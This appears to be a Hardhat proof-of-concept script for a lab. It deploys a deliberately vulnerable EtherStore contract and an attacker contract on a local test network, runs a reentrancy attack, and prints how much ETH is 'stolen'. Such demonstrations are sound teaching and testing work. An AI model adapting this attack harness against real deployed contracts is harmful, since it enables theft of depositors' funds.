const { ethers } = require("hardhat");

function eth(wei) {
  return `${ethers.formatEther(wei)} ETH`;
}

async function main() {
  const [depositor, attacker] = await ethers.getSigners();

  console.log("=== Setup ===");
  console.log("Depositor:", depositor.address);
  console.log("Attacker :", attacker.address);

  const Store = await ethers.getContractFactory(
    "contracts/vulnerable_etherstore.sol:VulnerableEtherStore"
  );
  const store = await Store.deploy();
  await store.waitForDeployment();
  const storeAddress = await store.getAddress();
  console.log("VulnerableEtherStore deployed at:", storeAddress);

  const Attacker = await ethers.getContractFactory("EtherStoreAttacker");
  const atk = await Attacker.connect(attacker).deploy(storeAddress);
  await atk.waitForDeployment();
  console.log("Attacker deployed at            :", await atk.getAddress());

  // Honest depositors fill the store with 5 ETH.
  await store.connect(depositor).depositFunds({ value: ethers.parseEther("5") });

  console.log("\n=== Before attack ===");
  console.log("Store balance             :", eth(await store.getBalance()));
  console.log("Attacker contract balance :", eth(await atk.getBalance()));

  console.log("\n=== Attack (deposit 1 ETH, withdraw -> reenter) ===");
  let outcome;
  try {
    const tx = await atk
      .connect(attacker)
      .attack({ value: ethers.parseEther("1") });
    await tx.wait();
    outcome = "ATTACK SUCCEEDED";
  } catch (err) {
    outcome = `ATTACK REVERTED: ${err.shortMessage || err.message}`;
  }
  console.log(outcome);

  const storeAfter = await store.getBalance();
  const atkAfter = await atk.getBalance();

  console.log("\n=== After attack ===");
  console.log("Store balance             :", eth(storeAfter));
  console.log("Attacker contract balance :", eth(atkAfter));

  const stolen = atkAfter - ethers.parseEther("1");
  console.log(
    "Net stolen (minus own 1 ETH seed):",
    stolen > 0n ? eth(stolen) : "0 ETH (no theft)"
  );
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
